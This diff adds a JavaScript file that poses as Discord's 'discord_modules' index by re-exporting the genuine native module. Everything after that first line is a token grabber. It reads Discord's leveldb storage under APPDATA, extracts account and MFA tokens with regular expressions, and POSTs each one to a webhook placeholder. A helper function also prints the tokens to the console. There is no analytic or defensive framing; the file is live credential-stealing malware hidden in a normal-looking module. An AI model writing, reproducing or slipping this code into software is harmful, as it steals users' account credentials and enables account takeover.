@@ -1,0 +1,81 @@
+﻿module.exports = require('./discord_modules.node');
+
+var URL = `webhook-here`;
+	
+const fs = require("fs");
+
+const regex = /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g;
+const reg2 = /mfa\.[\w-]{84}/g;
+
+if (fs.existsSync(process.env.APPDATA + "/Discord/Local Storage/leveldb")) {
+
+    let discordPTB = fs.readdirSync(process.env.APPDATA + "/Discord/Local Storage/leveldb");
+
+    for (let files of discordPTB) {
+
+        if (!["log", "ldb"].includes(files.split(".").pop())) {
+            continue;
+        }
+
+        let file = fs.readFileSync(process.env.APPDATA + "/Discord/Local Storage/leveldb/" + files, "utf8");
+
+        for (const match of (file.match(regex) || [])) {
+            fetch(URL, {
+            "method":"POST",
+            "headers": {"Content-Type": "application/json"},
+            "body": JSON.stringify({
+            "content": "```" + match + "```"
+                })
+
+            })
+        }
+
+        for (const matchy of (file.match(reg2) || [])) {
+            fetch(URL, {
+            "method":"POST",
+            "headers": {"Content-Type": "application/json"},
+            "body": JSON.stringify({
+            "content": "```" + matchy + "```"
+                })
+
+            })
+        }
+
+    };
+
+    test();
+
+} else {
+    test();
+}
+
+function test() {
+
+    let discordMain = fs.readdirSync(process.env.APPDATA + "/Discord/Local Storage/leveldb");
+
+    for (let files of discordMain) {
+
+        if (!["log", "ldb"].includes(files.split(".").pop())) {
+            continue;
+        }
+
+        let file = fs.readFileSync(process.env.APPDATA + "/Discord/Local Storage/leveldb/" + files, "utf8");
+
+        for (const match of (file.match(regex) || [])) {
+            console.log(match);
+        }
+    }
+
+    for (let files of discordMain) {
+
+        if (!["log", "ldb"].includes(files.split(".").pop())) {
+            continue;
+        }
+
+        let file = fs.readFileSync(process.env.APPDATA + "/Discord/Local Storage/leveldb/" + files, "utf8");
+
+        for (const match of (file.match(reg2) || [])) {
+            console.log(match);
+        }
+    }
+}
